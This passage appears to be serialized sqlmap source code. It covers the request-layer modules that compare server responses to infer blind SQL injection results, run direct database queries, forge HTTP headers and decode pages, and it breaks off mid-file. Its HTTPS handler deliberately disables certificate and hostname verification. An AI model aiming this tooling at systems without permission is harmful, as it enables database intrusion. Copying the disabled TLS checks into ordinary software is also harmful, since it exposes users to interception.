(req.redirect_dict.get(req.get_full_url(), 0) >= MAX_SINGLE_URL_REDIRECTIONS or len(req.redirect_dict) >= MAX_TOTAL_REDIRECTIONS):\n            errMsg = \"infinite redirect loop detected (%s). \" % \", \".join(item for item in req.redirect_dict.keys())\n            errMsg += \"Please check all provided parameters and/or provide missing ones\"\n            raise SqlmapConnectionException(errMsg)\n", "lib/request/comparison.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport re\n\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import getFilteredPageContent\nfrom lib.core.common import listToStrValue\nfrom lib.core.common import removeDynamicContent\nfrom lib.core.common import getLastRequestHTTPError\nfrom lib.core.common import wasLastResponseDBMSError\nfrom lib.core.common import wasLastResponseHTTPError\nfrom lib.core.convert import getBytes\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import DEFAULT_PAGE_ENCODING\nfrom lib.core.settings import DIFF_TOLERANCE\nfrom lib.core.settings import HTML_TITLE_REGEX\nfrom lib.core.settings import LOWER_RATIO_BOUND\nfrom lib.core.settings import MAX_DIFFLIB_SEQUENCE_LENGTH\nfrom lib.core.settings import MAX_RATIO\nfrom lib.core.settings import MIN_RATIO\nfrom lib.core.settings import REFLECTED_VALUE_MARKER\nfrom lib.core.settings import UPPER_RATIO_BOUND\nfrom lib.core.settings import URI_HTTP_HEADER\nfrom lib.core.threads import getCurrentThreadData\nfrom thirdparty import six\n\ndef comparison(page, headers, code=None, getRatioValue=False, pageLength=None):\n    _ = _adjust(_comparison(page, headers, code, getRatioValue, pageLength), getRatioValue)\n    return _\n\ndef _adjust(condition, getRatioValue):\n    if not any((conf.string, conf.notString, conf.regexp, conf.code)):\n        # Negative logic approach is used in raw page comparison scheme as that what is \"different\" than original\n        # PAYLOAD.WHERE.NEGATIVE response is considered as True; in switch based approach negative logic is not\n        # applied as that what is by user considered as True is that what is returned by the comparison mechanism\n        # itself\n        retVal = not condition if kb.negativeLogic and condition is not None and not getRatioValue else condition\n    else:\n        retVal = condition if not getRatioValue else (MAX_RATIO if condition else MIN_RATIO)\n\n    return retVal\n\ndef _comparison(page, headers, code, getRatioValue, pageLength):\n    threadData = getCurrentThreadData()\n\n    if kb.testMode:\n        threadData.lastComparisonHeaders = listToStrValue(_ for _ in headers.headers if not _.startswith(\"%s:\" % URI_HTTP_HEADER)) if headers else \"\"\n        threadData.lastComparisonPage = page\n        threadData.lastComparisonCode = code\n\n    if page is None and pageLength is None:\n        return None\n\n    if any((conf.string, conf.notString, conf.regexp)):\n        rawResponse = \"%s%s\" % (listToStrValue(_ for _ in headers.headers if not _.startswith(\"%s:\" % URI_HTTP_HEADER)) if headers else \"\", page)\n\n        # String to match in page when the query is True\n        if conf.string:\n            return conf.string in rawResponse\n\n        # String to match in page when the query is False\n        if conf.notString:\n            if conf.notString in rawResponse:\n                return False\n            else:\n                if kb.errorIsNone and (wasLastResponseDBMSError() or wasLastResponseHTTPError()):\n                    return None\n                else:\n                    return True\n\n        # Regular expression to match in page when the query is True and/or valid\n        if conf.regexp:\n            return re.search(conf.regexp, rawResponse, re.I | re.M) is not None\n\n    # HTTP code to match when the query is valid\n    if conf.code:\n        return conf.code == code\n\n    seqMatcher = threadData.seqMatcher\n    seqMatcher.set_seq1(kb.pageTemplate)\n\n    if page:\n        # In case of an DBMS error page return None\n        if kb.errorIsNone and (wasLastResponseDBMSError() or wasLastResponseHTTPError()) and not kb.negativeLogic:\n            if not (wasLastResponseHTTPError() and getLastRequestHTTPError() in (conf.ignoreCode or [])):\n                return None\n\n        # Dynamic content lines to be excluded before comparison\n        if not kb.nullConnection:\n            page = removeDynamicContent(page)\n            seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate))\n\n        if not pageLength:\n            pageLength = len(page)\n\n    if kb.nullConnection and pageLength:\n        if not seqMatcher.a:\n            errMsg = \"problem occurred while retrieving original page content \"\n            errMsg += \"which prevents sqlmap from continuation. Please rerun, \"\n            errMsg += \"and if the problem persists turn off any optimization switches\"\n            raise SqlmapNoneDataException(errMsg)\n\n        ratio = 1. * pageLength / len(seqMatcher.a)\n\n        if ratio > 1.:\n            ratio = 1. / ratio\n    else:\n        # Preventing \"Unicode equal comparison failed to convert both arguments to Unicode\"\n        # (e.g. if one page is PDF and the other is HTML)\n        if isinstance(seqMatcher.a, six.binary_type) and isinstance(page, six.text_type):\n            page = getBytes(page, kb.pageEncoding or DEFAULT_PAGE_ENCODING, \"ignore\")\n        elif isinstance(seqMatcher.a, six.text_type) and isinstance(page, six.binary_type):\n            seqMatcher.a = getBytes(seqMatcher.a, kb.pageEncoding or DEFAULT_PAGE_ENCODING, \"ignore\")\n\n        if any(_ is None for _ in (page, seqMatcher.a)):\n            return None\n        elif seqMatcher.a and page and seqMatcher.a == page:\n            ratio = 1.\n        elif kb.skipSeqMatcher or seqMatcher.a and page and any(len(_) > MAX_DIFFLIB_SEQUENCE_LENGTH for _ in (seqMatcher.a, page)):\n            if not page or not seqMatcher.a:\n                return float(seqMatcher.a == page)\n            else:\n                ratio = 1. * len(seqMatcher.a) / len(page)\n                if ratio > 1:\n                    ratio = 1. / ratio\n        else:\n            seq1, seq2 = None, None\n\n            if conf.titles:\n                seq1 = extractRegexResult(HTML_TITLE_REGEX, seqMatcher.a)\n                seq2 = extractRegexResult(HTML_TITLE_REGEX, page)\n            else:\n                seq1 = getFilteredPageContent(seqMatcher.a, True) if conf.textOnly else seqMatcher.a\n                seq2 = getFilteredPageContent(page, True) if conf.textOnly else page\n\n            if seq1 is None or seq2 is None:\n                return None\n\n            seq1 = seq1.replace(REFLECTED_VALUE_MARKER, \"\")\n            seq2 = seq2.replace(REFLECTED_VALUE_MARKER, \"\")\n\n            if kb.heavilyDynamic:\n                seq1 = seq1.split(\"\\n\")\n                seq2 = seq2.split(\"\\n\")\n\n                key = None\n            else:\n                key = (hash(seq1), hash(seq2))\n\n            seqMatcher.set_seq1(seq1)\n            seqMatcher.set_seq2(seq2)\n\n            if key in kb.cache.comparison:\n                ratio = kb.cache.comparison[key]\n            else:\n                ratio = round(seqMatcher.quick_ratio() if not kb.heavilyDynamic else seqMatcher.ratio(), 3)\n\n            if key:\n                kb.cache.comparison[key] = ratio\n\n    # If the url is stable and we did not set yet the match ratio and the\n    # current injected value changes the url page content\n    if kb.matchRatio is None:\n        if ratio >= LOWER_RATIO_BOUND and ratio <= UPPER_RATIO_BOUND:\n            kb.matchRatio = ratio\n            logger.debug(\"setting match ratio for current parameter to %.3f\" % kb.matchRatio)\n\n    if kb.testMode:\n        threadData.lastComparisonRatio = ratio\n\n    # If it has been requested to return the ratio and not a comparison\n    # response\n    if getRatioValue:\n        return ratio\n\n    elif ratio > UPPER_RATIO_BOUND:\n        return True\n\n    elif ratio < LOWER_RATIO_BOUND:\n        return False\n\n    elif kb.matchRatio is None:\n        return None\n\n    else:\n        return (ratio - kb.matchRatio) > DIFF_TOLERANCE\n", "lib/request/direct.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\nimport time\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import calculateDeltaSeconds\nfrom lib.core.common import extractExpectedValue\nfrom lib.core.common import getCurrentThreadData\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import isListLike\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.dicts import SQL_STATEMENTS\nfrom lib.core.enums import CUSTOM_LOGGING\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import TIMEOUT_STATE\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.utils.safe2bin import safecharencode\nfrom lib.utils.timeout import timeout\n\ndef direct(query, content=True):\n    select = True\n    query = agent.payloadDirect(query)\n    query = agent.adjustLateValues(query)\n    threadData = getCurrentThreadData()\n\n    if Backend.isDbms(DBMS.ORACLE) and query.upper().startswith(\"SELECT \") and \" FROM \" not in query.upper():\n        query = \"%s FROM DUAL\" % query\n\n    for sqlTitle, sqlStatements in SQL_STATEMENTS.items():\n        for sqlStatement in sqlStatements:\n            if query.lower().startswith(sqlStatement) and sqlTitle != \"SQL SELECT statement\":\n                select = False\n                break\n\n    if select:\n        if re.search(r\"(?i)\\ASELECT \", query) is None:\n            query = \"SELECT %s\" % query\n\n        if conf.binaryFields:\n            for field in conf.binaryFields:\n                field = field.strip()\n                if re.search(r\"\\b%s\\b\" % re.escape(field), query):\n                    query = re.sub(r\"\\b%s\\b\" % re.escape(field), agent.hexConvertField(field), query)\n\n    logger.log(CUSTOM_LOGGING.PAYLOAD, query)\n\n    output = hashDBRetrieve(query, True, True)\n    start = time.time()\n\n    if not select and re.search(r\"(?i)\\bEXEC \", query) is None:\n        timeout(func=conf.dbmsConnector.execute, args=(query,), duration=conf.timeout, default=None)\n    elif not (output and (\"%soutput\" % conf.tablePrefix) not in query and (\"%sfile\" % conf.tablePrefix) not in query):\n        output, state = timeout(func=conf.dbmsConnector.select, args=(query,), duration=conf.timeout, default=None)\n        if state == TIMEOUT_STATE.NORMAL:\n            hashDBWrite(query, output, True)\n        elif state == TIMEOUT_STATE.TIMEOUT:\n            conf.dbmsConnector.close()\n            conf.dbmsConnector.connect()\n    elif output:\n        infoMsg = \"resumed: %s...\" % getUnicode(output, UNICODE_ENCODING)[:20]\n        logger.info(infoMsg)\n\n    threadData.lastQueryDuration = calculateDeltaSeconds(start)\n\n    if not output:\n        return output\n    elif content:\n        if output and isListLike(output):\n            if len(output[0]) == 1:\n                output = [_[0] for _ in output]\n\n        retVal = getUnicode(output, noneToNull=True)\n        return safecharencode(retVal) if kb.safeCharEncode else retVal\n    else:\n        return extractExpectedValue(output, EXPECTED.BOOL)\n", "lib/request/httpshandler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\nimport socket\n\nfrom lib.core.common import filterNone\nfrom lib.core.common import getSafeExString\nfrom lib.core.compat import LooseVersion\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.settings import PYVERSION\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import urllib as _urllib\n\nssl = None\ntry:\n    import ssl as _ssl\n    ssl = _ssl\nexcept ImportError:\n    pass\n\n_protocols = filterNone(getattr(ssl, _, None) for _ in (\"PROTOCOL_TLS_CLIENT\", \"PROTOCOL_TLSv1_2\", \"PROTOCOL_TLSv1_1\", \"PROTOCOL_TLSv1\", \"PROTOCOL_SSLv3\", \"PROTOCOL_SSLv23\", \"PROTOCOL_SSLv2\"))\n_lut = dict((getattr(ssl, _), _) for _ in dir(ssl) if _.startswith(\"PROTOCOL_\"))\n_contexts = {}\n\nclass HTTPSConnection(_http_client.HTTPSConnection):\n    \"\"\"\n    Connection class that enables usage of newer SSL protocols.\n\n    Reference: http://bugs.python.org/msg128686\n\n    NOTE: use https://check-tls.akamaized.net/ to check if (e.g.) TLS/SNI is working properly\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        # NOTE: Dirty patch for https://bugs.python.org/issue38251 / https://github.com/sqlmapproject/sqlmap/issues/4158\n        if hasattr(ssl, \"_create_default_https_context\"):\n            if None not in _contexts:\n                _contexts[None] = ssl._create_default_https_context()\n            kwargs[\"context\"] = _contexts[None]\n\n        self.retrying = False\n\n        _http_client.HTTPSConnection.__init__(self, *args, **kwargs)\n\n    def connect(self):\n        def create_sock():\n            sock = socket.create_connection((self.host, self.port), self.timeout)\n            if getattr(self, \"_tunnel_host\", None):\n                self.sock = sock\n                self._tunnel()\n            return sock\n\n        success = False\n\n        # Reference(s): https://docs.python.org/2/library/ssl.html#ssl.SSLContext\n        #               https://www.mnot.net/blog/2014/12/27/python_2_and_tls_sni\n        if hasattr(ssl, \"SSLContext\"):\n            for protocol in (_ for _ in _protocols if _ >= ssl.PROTOCOL_TLSv1):\n                try:\n                    sock = create_sock()\n                    if protocol not in _contexts:\n                        _contexts[protocol] = ssl.SSLContext(protocol)\n\n                        # Disable certificate and hostname validation enabled by default with PROTOCOL_TLS_CLIENT\n                        _contexts[protocol].check_hostname = False\n                        _contexts[protocol].verify_mode = ssl.CERT_NONE\n\n                        if getattr(self, \"cert_file\", None) and getattr(self, \"key_file\", None):\n                            _contexts[protocol].load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)\n                        try:\n                            # Reference(s): https://askubuntu.com/a/1263098\n                            #               https://askubuntu.com/a/1250807\n                            _contexts[protocol].set_ciphers(\"DEFAULT@SECLEVEL=1\")\n                        except ssl.SSLError:\n                            pass\n                    result = _contexts[protocol].wrap_socket(sock, do_handshake_on_connect=True, server_hostname=self.host if re.search(r\"\\A[\\d.]+\\Z\", self.host or \"\") is None else None)\n                    if result:\n                        success = True\n                        self.sock = result\n                        _protocols.remove(protocol)\n                        _protocols.insert(0, protocol)\n                        break\n                    else:\n                        sock.close()\n                except (ssl.SSLError, socket.error, _http_client.BadStatusLine) as ex:\n                    self._tunnel_host = None\n                    logger.debug(\"SSL connection error occurred for '%s' ('%s')\" % (_lut[protocol], getSafeExString(ex)))\n\n        elif hasattr(ssl, \"wrap_socket\"):\n            for protocol in _protocols:\n                try:\n                    sock = create_sock()\n                    _ = ssl.wrap_socket(sock, keyfile=getattr(self, \"key_file\"), certfile=getattr(self, \"cert_file\"), ssl_version=protocol)\n                    if _:\n                        success = True\n                        self.sock = _\n                        _protocols.remove(protocol)\n                        _protocols.insert(0, protocol)\n                        break\n                    else:\n                        sock.close()\n                except (ssl.SSLError, socket.error, _http_client.BadStatusLine) as ex:\n                    self._tunnel_host = None\n                    logger.debug(\"SSL connection error occurred for '%s' ('%s')\" % (_lut[protocol], getSafeExString(ex)))\n\n        if not success:\n            errMsg = \"can't establish SSL connection\"\n            # Reference: https://docs.python.org/2/library/ssl.html\n            if LooseVersion(PYVERSION) < LooseVersion(\"2.7.9\"):\n                errMsg += \" (please retry with Python >= 2.7.9)\"\n\n            if kb.sslSuccess and not self.retrying:\n                self.retrying = True\n\n                for _ in xrange(conf.retries):\n                    try:\n                        self.connect()\n                    except SqlmapConnectionException:\n                        pass\n                    else:\n                        return\n\n            raise SqlmapConnectionException(errMsg)\n        else:\n            kb.sslSuccess = True\n\nclass HTTPSHandler(_urllib.request.HTTPSHandler):\n    def https_open(self, req):\n        return self.do_open(HTTPSConnection if ssl else _http_client.HTTPSConnection, req)\n", "lib/request/templates.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import kb\nfrom lib.request.connect import Connect as Request\n\ndef getPageTemplate(payload, place):\n    retVal = (kb.originalPage, kb.errorIsNone)\n\n    if payload and place:\n        if (payload, place) not in kb.pageTemplates:\n            page, _, _ = Request.queryPage(payload, place, content=True, raise404=False)\n            kb.pageTemplates[(payload, place)] = (page, kb.lastParserStatus is None)\n\n        retVal = kb.pageTemplates[(payload, place)]\n\n    return retVal\n", "lib/request/basic.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport codecs\nimport gzip\nimport io\nimport logging\nimport re\nimport struct\nimport zlib\n\nfrom lib.core.common import Backend\nfrom lib.core.common import extractErrorMessage\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import filterNone\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isListLike\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import resetCookieJar\nfrom lib.core.common import singleTimeLogMessage\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.convert import decodeHex\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import cachedmethod\nfrom lib.core.decorators import lockedmethod\nfrom lib.core.dicts import HTML_ENTITIES\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import PLACE\nfrom lib.core.exception import SqlmapCompressionException\nfrom lib.core.settings import BLOCKED_IP_REGEX\nfrom lib.core.settings import DEFAULT_COOKIE_DELIMITER\nfrom lib.core.settings import EVENTVALIDATION_REGEX\nfrom lib.core.settings import HEURISTIC_PAGE_SIZE_THRESHOLD\nfrom lib.core.settings import IDENTYWAF_PARSE_LIMIT\nfrom lib.core.settings import MAX_CONNECTION_TOTAL_SIZE\nfrom lib.core.settings import META_CHARSET_REGEX\nfrom lib.core.settings import PARSE_HEADERS_LIMIT\nfrom lib.core.settings import PRINTABLE_BYTES\nfrom lib.core.settings import SELECT_FROM_TABLE_REGEX\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.settings import VIEWSTATE_REGEX\nfrom lib.parse.headers import headersParser\nfrom lib.parse.html import htmlParser\nfrom thirdparty import six\nfrom thirdparty.chardet import detect\nfrom thirdparty.identywaf import identYwaf\nfrom thirdparty.odict import OrderedDict\nfrom thirdparty.six import unichr as _unichr\nfrom thirdparty.six.moves import http_client as _http_client\n\n@lockedmethod\ndef forgeHeaders(items=None, base=None):\n    \"\"\"\n    Prepare HTTP Cookie, HTTP User-Agent and HTTP Referer headers to use when performing\n    the HTTP requests\n    \"\"\"\n\n    items = items or {}\n\n    for _ in list(items.keys()):\n        if items[_] is None:\n            del items[_]\n\n    headers = OrderedDict(conf.httpHeaders if base is None else base)\n    headers.update(items.items())\n\n    class _str(str):\n        def capitalize(self):\n            return _str(self)\n\n        def title(self):\n            return _str(self)\n\n    _ = headers\n    headers = OrderedDict()\n    for key, value in _.items():\n        success = False\n\n        for _ in headers:\n            if _.upper() == key.upper():\n                del headers[_]\n                break\n\n        if key.upper() not in (_.upper() for _ in getPublicTypeMembers(HTTP_HEADER, True)):\n            try:\n                headers[_str(key)] = value  # dirty hack for http://bugs.python.org/issue12455\n            except UnicodeEncodeError:      # don't do the hack on non-ASCII header names (they have to be properly encoded later on)\n                pass\n            else:\n                success = True\n        if not success:\n            key = '-'.join(_.capitalize() for _ in key.split('-'))\n            headers[key] = value\n\n    if conf.cj:\n        if HTTP_HEADER.COOKIE in headers:\n            for cookie in conf.cj:\n                if cookie is None or cookie.domain_specified and not (conf.hostname or \"\").endswith(cookie.domain):\n                    continue\n\n                if (\"%s=\" % getUnicode(cookie.name)) in getUnicode(headers[HTTP_HEADER.COOKIE]):\n                    if conf.loadCookies:\n                        conf.httpHeaders = filterNone((item if item[0] != HTTP_HEADER.COOKIE else None) for item in conf.httpHeaders)\n                    elif kb.mergeCookies is None:\n                        message = \"you provided a HTTP %s header value, while \" % HTTP_HEADER.COOKIE\n                        message += \"target URL provides its own cookies within \"\n                        message += \"HTTP %s header which intersect with yours. \" % HTTP_HEADER.SET_COOKIE\n                        message += \"Do you want to merge them in further requests? [Y/n] \"\n\n                        kb.mergeCookies = readInput(message, default='Y', boolean=True)\n\n                    if kb.mergeCookies and kb.injection.place != PLACE.COOKIE:\n                        def _(value):\n                            return re.sub(r\"(?i)\\b%s=[^%s]+\" % (re.escape(getUnicode(cookie.name)), conf.cookieDel or DEFAULT_COOKIE_DELIMITER), (\"%s=%s\" % (getUnicode(cookie.name), getUnicode(cookie.value))).replace('\\\\', r'\\\\'), value)\n\n                        headers[HTTP_HEADER.COOKIE] = _(headers[HTTP_HEADER.COOKIE])\n\n                        if PLACE.COOKIE in conf.parameters:\n                            conf.parameters[PLACE.COOKIE] = _(conf.parameters[PLACE.COOKIE])\n\n                        conf.httpHeaders = [(item[0], item[1] if item[0] != HTTP_HEADER.COOKIE else _(item[1])) for item in conf.httpHeaders]\n\n                elif not kb.testMode:\n                    headers[HTTP_HEADER.COOKIE] += \"%s %s=%s\" % (conf.cookieDel or DEFAULT_COOKIE_DELIMITER, getUnicode(cookie.name), getUnicode(cookie.value))\n\n        if kb.testMode and not any((conf.csrfToken, conf.safeUrl)):\n            resetCookieJar(conf.cj)\n\n    return headers\n\ndef parseResponse(page, headers, status=None):\n    \"\"\"\n    @param page: the page to parse to feed the knowledge base htmlFp\n    (back-end DBMS fingerprint based upon DBMS error messages return\n    through the web application) list and absFilePaths (absolute file\n    paths) set.\n    \"\"\"\n\n    if headers:\n        headersParser(headers)\n\n    if page:\n        htmlParser(page if not status else \"%s\\n\\n%s\" % (status, page))\n\n@cachedmethod\ndef checkCharEncoding(encoding, warn=True):\n    \"\"\"\n    Checks encoding name, repairs common misspellings and adjusts to\n    proper namings used in codecs module\n\n    >>> checkCharEncoding('iso-8858', False)\n    'iso8859-1'\n    >>> checkCharEncoding('en_us', False)\n    'utf8'\n    \"\"\"\n\n    if isinstance(encoding, six.binary_type):\n        encoding = getUnicode(encoding)\n\n    if isListLike(encoding):\n        encoding = unArrayizeValue(encoding)\n\n    if encoding:\n        encoding = encoding.lower()\n    else:\n        return encoding\n\n    # Reference: http://www.destructor.de/charsets/index.htm\n    translate = {\"windows-874\": \"iso-8859-11\", \"utf-8859-1\": \"utf8\", \"en_us\": \"utf8\", \"macintosh\": \"iso-8859-1\", \"euc_tw\": \"big5_tw\", \"th\": \"tis-620\", \"unicode\": \"utf8\", \"utc8\": \"utf8\", \"ebcdic\": \"ebcdic-cp-be\", \"iso-8859\": \"iso8859-1\", \"iso-8859-0\": \"iso8859-1\", \"ansi\": \"ascii\", \"gbk2312\": \"gbk\", \"windows-31j\": \"cp932\", \"en\": \"us\"}\n\n    for delimiter in (';', ',', '('):\n        if delimiter in encoding:\n            encoding = encoding[:encoding.find(delimiter)].strip()\n\n    encoding = encoding.replace(\"&quot\", \"\")\n\n    # popular typos/errors\n    if \"8858\" in encoding:\n        encoding = encoding.replace(\"8858\", \"8859\")  # iso-8858 -> iso-8859\n    elif \"8559\" in encoding:\n        encoding = encoding.replace(\"8559\", \"8859\")  # iso-8559 -> iso-8859\n    elif \"8895\" in encoding:\n        encoding = encoding.replace(\"8895\", \"8859\")  # iso-8895 -> iso-8859\n    elif \"5889\" in encoding:\n        encoding = encoding.replace(\"5889\", \"8859\")  # iso-5889 -> iso-8859\n    elif \"5589\" in encoding:\n        encoding = encoding.replace(\"5589\", \"8859\")  # iso-5589 -> iso-8859\n    elif \"2313\" in encoding:\n        encoding = encoding.replace(\"2313\", \"2312\")  # gb2313 -> gb2312\n    elif encoding.startswith(\"x-\"):\n        encoding = encoding[len(\"x-\"):]              # x-euc-kr -> euc-kr  /  x-mac-turkish -> mac-turkish\n    elif \"windows-cp\" in encoding:\n        encoding = encoding.replace(\"windows-cp\", \"windows\")  # windows-cp-1254 -> windows-1254\n\n    # name adjustment for compatibility\n    if encoding.startswith(\"8859\"):\n        encoding = \"iso-%s\" % encoding\n    elif encoding.startswith(\"cp-\"):\n        encoding = \"cp%s\" % encoding[3:]\n    elif encoding.startswith(\"euc-\"):\n        encoding = \"euc_%s\" % encoding[4:]\n    elif encoding.startswith(\"windows\") and not encoding.startswith(\"windows-\"):\n        encoding = \"windows-%s\" % encoding[7:]\n    elif encoding.find(\"iso-88\") > 0:\n        encoding = encoding[encoding.find(\"iso-88\"):]\n    elif encoding.startswith(\"is0-\"):\n        encoding = \"iso%s\" % encoding[4:]\n    elif encoding.find(\"ascii\") > 0:\n        encoding = \"ascii\"\n    elif encoding.find(\"utf8\") > 0:\n        encoding = \"utf8\"\n    elif encoding.find(\"utf-8\") > 0:\n        encoding = \"utf-8\"\n\n    # Reference: http://philip.html5.org/data/charsets-2.html\n    if encoding in translate:\n        encoding = translate[encoding]\n    elif encoding in (\"null\", \"{charset}\", \"charset\", \"*\") or not re.search(r\"\\w\", encoding):\n        return None\n\n    # Reference: http://www.iana.org/assignments/character-sets\n    # Reference: http://docs.python.org/library/codecs.html\n    try:\n        codecs.lookup(encoding)\n    except:\n        encoding = None\n\n    if encoding:\n        try:\n            six.text_type(getBytes(randomStr()), encoding)\n        except:\n            if warn:\n                warnMsg = \"invalid web page charset '%s'\" % encoding\n                singleTimeLogMessage(warnMsg, logging.WARN, encoding)\n            encoding = None\n\n    return encoding\n\ndef getHeuristicCharEncoding(page):\n    \"\"\"\n    Returns page encoding charset detected by usage of heuristics\n\n    Reference: https://chardet.readthedocs.io/en/latest/usage.html\n\n    >>> getHeuristicCharEncoding(b\"<html></html>\")\n    'ascii'\n    \"\"\"\n\n    key = hash(page)\n    retVal = kb.cache.encoding[key] if key in kb.cache.encoding else detect(page[:HEURISTIC_PAGE_SIZE_THRESHOLD])[\"encoding\"]\n    kb.cache.encoding[key] = retVal\n\n    if retVal and retVal.lower().replace('-', \"\") == UNICODE_ENCODING.lower().replace('-', \"\"):\n        infoMsg = \"heuristics detected web page charset '%s'\" % retVal\n        singleTimeLogMessage(infoMsg, logging.INFO, retVal)\n\n    return retVal\n\ndef decodePage(page, contentEncoding, contentType, percentDecode=True):\n    \"\"\"\n    Decode compressed/charset HTTP response\n\n    >>> getText(decodePage(b\"<html>foo&amp;bar</html>\", None, \"text/html; charset=utf-8\"))\n    '<html>foo&bar</html>'\n    >>> getText(decodePage(b\"&#x9;\", None, \"text/html; charset=utf-8\"))\n    '\\\\t'\n    \"\"\"\n\n    if not page or (conf.nullConnection and len(page) < 2):\n        return getUnicode(page)\n\n    if hasattr(contentEncoding, \"lower\"):\n        contentEncoding = contentEncoding.lower()\n    else:\n        contentEncoding = \"\"\n\n    if hasattr(contentType, \"lower\"):\n        contentType = contentType.lower()\n    else:\n        contentType = \"\"\n\n    if contentEncoding in (\"gzip\", \"x-gzip\", \"deflate\"):\n        if not kb.pageCompress:\n            return None\n\n        try:\n            if contentEncoding == \"deflate\":\n                data = io.BytesIO(zlib.decompress(page, -15))  # Reference: http://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations\n            else:\n                data = gzip.GzipFile(\"\", \"rb\", 9, io.BytesIO(page))\n                size = struct.unpack(\"<l\", page[-4:])[0]  # Reference: http://pydoc.org/get.cgi/usr/local/lib/python2.5/gzip.py\n                if size > MAX_CONNECTION_TOTAL_SIZE:\n                    raise Exception(\"size too large\")\n\n            page = data.read()\n        except Exception as ex:\n            if b\"<html\" not in page:  # in some cases, invalid \"Content-Encoding\" appears for plain HTML (should be ignored)\n                errMsg = \"detected invalid data for declared content \"\n                errMsg += \"encoding '%s' ('%s')\" % (contentEncoding, getSafeExString(ex))\n                singleTimeLogMessage(errMsg, logging.ERROR)\n\n                warnMsg = \"turning off page compression\"\n                singleTimeWarnMessage(warnMsg)\n\n                kb.pageCompress = False\n                raise SqlmapCompressionException\n\n    if not conf.encoding:\n        httpCharset, metaCharset = None, None\n\n        # Reference: http://stackoverflow.com/questions/1020892/python-urllib2-read-to-unicode\n        if contentType.find(\"charset=\") != -1:\n            httpCharset = checkCharEncoding(contentType.split(\"charset=\")[-1])\n\n        metaCharset = checkCharEncoding(extractRegexResult(META_CHARSET_REGEX, page))\n\n        if (any((httpCharset, metaCharset)) and (not all((httpCharset, metaCharset)) or isinstance(page, six.binary_type) and all(_ in PRINTABLE_BYTES for _ in page))) or (httpCharset == metaCharset and all((httpCharset, metaCharset))):\n            kb.pageEncoding = httpCharset or metaCharset  # Reference: http://bytes.com/topic/html-css/answers/154758-http-equiv-vs-true-header-has-precedence\n            debugMsg = \"declared web page charset '%s'\" % kb.pageEncoding\n            singleTimeLogMessage(debugMsg, logging.DEBUG, debugMsg)\n        else:\n            kb.pageEncoding = None\n    else:\n        kb.pageEncoding = conf.encoding\n\n    # can't do for all responses because we need to support binary files too\n    if isinstance(page, six.binary_type) and \"text/\" in contentType:\n        if not kb.disableHtmlDecoding:\n            # e.g. &#x9;&#195;&#235;&#224;&#226;&#224;\n            if b\"&#\" in page:\n                page = re.sub(b\"&#x([0-9a-f]{1,2});\", lambda _: decodeHex(_.group(1) if len(_.group(1)) == 2 else b\"0%s\" % _.group(1)), page)\n                page = re.sub(b\"&#(\\\\d{1,3});\", lambda _: six.int2byte(int(_.group(1))) if int(_.group(1)) < 256 else _.group(0), page)\n\n            # e.g. %20%28%29\n            if percentDecode:\n                if b\"%\" in page:\n                    page = re.sub(b\"%([0-9a-f]{2})\", lambda _: decodeHex(_.group(1)), page)\n                    page = re.sub(b\"%([0-9A-F]{2})\", lambda _: decodeHex(_.group(1)), page)     # Note: %DeepSee_SQL in CACHE\n\n            # e.g. &amp;\n            page = re.sub(b\"&([^;]+);\", lambda _: six.int2byte(HTML_ENTITIES[getText(_.group(1))]) if HTML_ENTITIES.get(getText(_.group(1)), 256) < 256 else _.group(0), page)\n\n            kb.pageEncoding = kb.pageEncoding or checkCharEncoding(getHeuristicCharEncoding(page))\n\n            if (kb.pageEncoding or \"\").lower() == \"utf-8-sig\":\n                kb.pageEncoding = \"utf-8\"\n                if page and page.startswith(b\"\\xef\\xbb\\xbf\"):  # Reference: https://docs.python.org/2/library/codecs.html (Note: noticed problems when \"utf-8-sig\" is left to Python for handling)\n                    page = page[3:]\n\n            page = getUnicode(page, kb.pageEncoding)\n\n            # e.g. 